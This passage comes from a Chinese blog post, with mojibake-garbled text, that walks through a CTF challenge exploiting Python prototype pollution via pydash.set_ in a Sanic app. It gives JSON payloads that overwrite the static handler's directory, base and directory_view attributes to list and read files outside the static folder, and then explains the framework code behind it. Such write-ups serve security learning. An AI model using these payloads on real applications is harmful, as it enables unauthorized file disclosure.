</span></span><span class="line"><span class="cl">        <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">pollute</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_dir</span><span class="o">=</span><span class="n">create_log_dir</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_dir_bak</span><span class="o">=</span><span class="n">log_dir</span><span class="o">+</span><span class="s2">&#34;..&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_file</span><span class="o">=</span><span class="s2">&#34;/tmp/&#34;</span><span class="o">+</span><span class="n">log_dir</span><span class="o">+</span><span class="s2">&#34;/access.log&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">log_file_bak</span><span class="o">=</span><span class="s2">&#34;/tmp/&#34;</span><span class="o">+</span><span class="n">log_dir_bak</span><span class="o">+</span><span class="s2">&#34;/access.log.bak&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">=</span><span class="s1">&#39;key: &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;|&#39;</span><span class="o">+</span><span class="s1">&#39;value: &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#ç”Ÿæˆæ—¥å¿—æ–‡ä»¶</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;mkdir /tmp/&#34;</span><span class="o">+</span><span class="n">log_dir</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#å¤‡ä»½æ—¥å¿—æ–‡ä»¶</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;mkdir /tmp/&#34;</span><span class="o">+</span><span class="n">log_dir_bak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">log_file_bak</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;ï¼ï¼ï¼æ­¤åœ°ç¦æ­¢èƒ¡æ¥ï¼Œä½ çš„éæ³•æ“ä½œå·²ç»è¢«è®°å½•ï¼ï¼ï¼&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°å¤šå‡ºæ¥çš„è·¯ç”±:Wa58a1qEQ59857qQRPPQï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®å¾—åˆ°hintï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag in /app,but you need to find his nameï¼ï¼ï¼
</span></span><span class="line"><span class="cl">Find a way to see the file names in the app directory
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆå¾ˆæ˜æ˜¾æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•åˆ—å‡ºappç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p>è¿˜çœ‹åˆ°adminLookè·¯ç”±å¯ä»¥çœ‹åˆ°/tmpç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè€Œæˆ‘ä»¬çš„éæ³•æ—¥å¿—å°±è®°å½•åœ¨æ­¤ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬å…ˆéšä¾¿è§¦å‘ä¸€æ¬¡éæ³•è®°å½•,å°±æ˜¯æ¯”å¦‚æŠŠkeyçš„å€¼ç”¨åˆ—è¡¨ä¼ ï¼Œ</p>
<p>æ¥ç€è®¿é—®adminLookè·¯ç”±</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234242206.png"
	width="1824"
	height="598"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234242206_hu14975426949740703532.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234242206_hu17419839198685726526.png 1024w"
	loading="lazy"
	
		alt="image-20250328234242206"
	
	
		class="gallery-image" 
		data-flex-grow="305"
		data-flex-basis="732px"
	
></p>
<p>å‡ºç°æ—¥å¿—ç›®å½•ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è®¿é—®è¿™ä¸ªç›®å½•å®ç°ç©¿è¶Šåˆ°ä¸Šå±‚ç›®å½•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&#34;,&#34;value&#34;: &#34;/tmp&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆåˆ‡æ¢åˆ°tmpç›®å½•ä¸‹ï¼Œå†æ±¡æŸ“baseçš„å€¼:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&#34;,&#34;value&#34;: &#34;static/YPdeyP&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>åŒæ—¶è®°å¾—å¼€å¯åˆ—ç›®å½•åŠŸèƒ½:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;key&#34;:&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&#34;,&#34;value&#34;: true}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¥ç€è®¿é—®/static/YPdeyP../å°±èƒ½çœ‹åˆ°flagåå­—ï¼Œæ¥ç€å†æ±¡æŸ“å›æ ¹ç›®å½•ï¼Œç„¶åè®¿é—®static/app/45W698WqtsgQT1_flagå°±è¡Œäº†</p>
<p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234816476.png"
	width="1241"
	height="335"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234816476_hu14384759701713287701.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328234816476_hu13290809883064569287.png 1024w"
	loading="lazy"
	
		alt="image-20250328234816476"
	
	
		class="gallery-image" 
		data-flex-grow="370"
		data-flex-basis="889px"
	
></p>
<p>æ¥ä¸‹æ¥åˆ†æåŸç†</p>
<p>å‰é¢ç”¨åˆ°è¿™ä¸ªstatic.handlerï¼Œé¦–å…ˆæ˜¯æ ¹åŸºstaticå‡½æ•°ï¼Œä¹‹åè·Ÿè¿›<code>DirectoryHandler</code>ç±»</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">directory_view</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_index</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="bp">self</span><span class="o">.</span><span class="n">directory</span> <span class="o">/</span> <span class="n">current</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">debug</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¼€å¯åˆ—ç›®å½•åŠŸèƒ½åï¼Œå°±ä¼šè°ƒç”¨_indexæ–¹æ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">_index</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">location</span><span class="p">:</span> <span class="n">Path</span><span class="p">,</span> <span class="n">path</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">debug</span><span class="p">:</span> <span class="nb">bool</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Remove empty path elements, append slash</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;//&#34;</span> <span class="ow">in</span> <span class="n">path</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">path</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s2">/&#34;</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">path</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">p</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Render file browser</span>
</span></span><span class="line"><span class="cl">        <span class="n">page</span> <span class="o">=</span> <span class="n">DirectoryPage</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_iter_files</span><span class="p">(</span><span class="n">location</span><span class="p">),</span> <span class="n">path</span><span class="p">,</span> <span class="n">debug</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">html</span><span class="p">(</span><span class="n">page</span><span class="o">.</span><span class="n">render</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°è¿™é‡Œåˆ—å‡ºçš„ç›®å½•è·¯å¾„å°±æ˜¯ç”±self.directory(è¿™ç©æ„æ˜¯ä¸ªå¯¹è±¡ï¼Œè¿™é‡Œçš„å€¼æ˜¯å…¶ä¸­çš„partsæ§åˆ¶çš„)+currentæ‹¼æ¥å¾—åˆ°çš„,å¦‚æœæˆ‘èƒ½æ§åˆ¶currentçš„å€¼ï¼Œä¾‹å¦‚ä¸º&quot;..&quot;ï¼Œé‚£è¿™æ ·ä¸å°±å¯ä»¥å®ç°ç›®å½•ç©¿è¶Šï¼Œç›´æ¥åˆ—å‡ºä¸Šå±‚ç›®å½•ä¸‹çš„æ–‡ä»¶äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="n">current</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)[</span><span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">base</span><span class="p">)</span> <span class="p">:]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>  <span class="c1"># noqa: E203</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œpathåœ¨è¢«åˆ†å‰²çš„æ—¶å€™æœ‰ä¸ªæƒ…å†µï¼Œå°±æ˜¯å°†è·¯å¾„ä»baseå­—ç¬¦ä¸²ç»“å°¾å¼€å§‹çš„æ‰€æœ‰å­—ç¬¦ä¸²å»æ‰å¤´å°¾çš„<code>'/'</code>å­—ç¬¦åè¿”å›ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“æˆ‘ä»¬æŠŠbaseå±æ€§æ±¡æŸ“æˆæŒ‡å®šçš„å­—ç¬¦ä¸²ä¹‹åï¼Œåé¢å¦‚æœå‡ºç°äº†ä¸¤ä¸ªç‚¹ï¼Œä¹Ÿå°±æ˜¯<code>..</code>å°±è¯´æ˜äº†currentè¿”å›çš„å­—ç¬¦ä¸²å¯èƒ½å­˜åœ¨è·¯å¾„ç©¿è¶Šã€‚</p>
<p>è¦æƒ³è®©currentå˜æˆ..ï¼Œå°±å¾—è®¿é—®ä¸€ä¸ªç›®å½•,å¦‚æœæˆ‘ä»¬ç›´æ¥è®¿é—®/static/ctf../</p>
<p>æ­¤æ—¶çš„baseæ˜¯static,è€Œcurrentæ˜¯ctf..</p>
<p>æ˜¾ç„¶æˆ‘ä»¬æ§åˆ¶baseä¸ºstatic/ctf,é‚£ä¹ˆctfå°±ä¼šä¸º..äº†</p>
<p>æ‰€ä»¥å¯ä»¥å…ˆæ±¡æŸ“baseæˆstatic/ctf,æ¥ç€å†è®¿é—®static/ctf../å°±èƒ½å®ç°ç›®å½•ç©¿è¶Š</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">åŸå‹é“¾æ±¡æŸ“</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">
        
        
            <div class="article-image">
                <img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/1.12f747bb3ec58fc56270470713ba0ba0.png" 
                        width="1920" 
                        height="1080" 
                        loading="lazy"
                        alt="Featured image of post pythonå†…å­˜é©¬å­¦ä¹ "
                        
                        data-hash="md5-EvdHuz7Fj8VicEcHE7oLoA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonå†…å­˜é©¬å­¦ä¹ </h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
        
        
            <div class="article-image">
                <img src="/p/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.1b0b5baf2fbab6af45f40a9c0e824c92.png" 
                        width="1792" 
                        height="2560" 
                        loading="lazy"
                        alt="Featured image of post pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"
                        
                        data-hash="md5-Gwtbry&#43;6tq9F9AqcDoJMkg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pythonæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
        
        
            <div class="article-image">
                <img src="/p/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.a84481e2accdd7ee83233c01f9ed1648.jpg" 
                        width="3363" 
                        height="5979" 
                        loading="lazy"
                        alt="Featured image of post pickleååºåˆ—åŒ–"
                        
                        data-hash="md5-qESB4qzN1&#43;6DIzwB&#43;e0WSA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">pickleååºåˆ—åŒ–</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/sstiflask/">
        
        
            <div class="article-image">
                <img src="/p/sstiflask/1.32ee771779f68a74b246d7e5c641ed48.png" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post SSTI(flask)"
                        
                        data-hash="md5-Mu53F3n2inSyRtflxkHtSA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">SSTI(flask)</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 æ— æ•Œå¯çˆ±ç¾å’•å™œ
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@main";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
